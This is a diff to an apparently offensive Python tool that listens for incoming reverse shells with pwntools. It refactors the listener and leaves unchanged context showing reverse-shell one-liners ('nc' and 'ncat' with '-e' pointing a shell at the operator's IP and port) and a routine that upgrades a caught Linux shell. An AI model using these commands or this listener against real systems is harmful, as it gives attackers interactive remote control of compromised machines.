@@ -8,7 +8,7 @@ import signal
 import atexit
 
 from dotenv import load_dotenv
-from pwnlib.tubes.server import server, remote
+from pwnlib.tubes.listen import listen
 from time import sleep
 
 
@@ -51,7 +51,7 @@ def colored_print(text: str, color: str = Colors.WHITE):
     print(f"{color}{text}{Colors.END}")
 
 
-def execute(conn: remote, cmd: str):
+def execute(conn: listen, cmd: str):
     """Execute a command on the remote connection"""
     conn.sendline(cmd.encode())
     print(conn.recvline().decode())
@@ -180,7 +180,6 @@ def print_revshell_examples(
     colored_print(
         f"nc{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}", Colors.YELLOW
     )
-    print()
     colored_print(
         f"ncat{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}",
         Colors.YELLOW,
@@ -234,7 +233,7 @@ def print_revshell_examples(
     print()
 
 
-def upgrade_linux_shell(conn: remote):
+def upgrade_linux_shell(conn: listen):
     """Upgrade Linux shell with QoL improvements"""
     colored_print("[+] Trying to upgrade shell...", Colors.BLUE)
 
@@ -305,11 +304,8 @@ def main():
     colored_print("    Press Ctrl+C to exit", Colors.CYAN)
 
     try:
-        s = server(port)
-        conn: remote = s.next_connection()
-        colored_print(
-            f"[+] Connection received from {conn.rhost}:{conn.rport}", Colors.GREEN
-        )
+        conn = listen(port).wait_for_connection()
+        colored_print("[+] Connection received!", Colors.GREEN)
 
         if is_linux:
             upgrade_linux_shell(conn)
